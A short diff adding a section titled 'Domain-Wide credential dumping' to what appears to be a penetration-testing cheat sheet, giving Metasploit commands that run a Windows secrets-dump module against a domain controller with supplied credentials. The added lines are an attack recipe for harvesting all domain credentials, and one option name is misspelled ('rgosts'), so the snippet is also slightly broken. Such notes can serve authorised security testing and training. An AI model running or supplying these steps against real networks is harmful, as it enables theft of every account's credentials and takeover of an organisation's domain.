@@ -45,3 +45,14 @@ Execution
     set RHOSTS IP
     run
 
+### 5) Domain-Wide credential dumping
+
+    use auxiliary/gather/windows_secrets_dump
+
+Execution
+
+    set username USER
+    set password PASSWORD
+    set rgosts DC_IP
+    set action domain
+    run
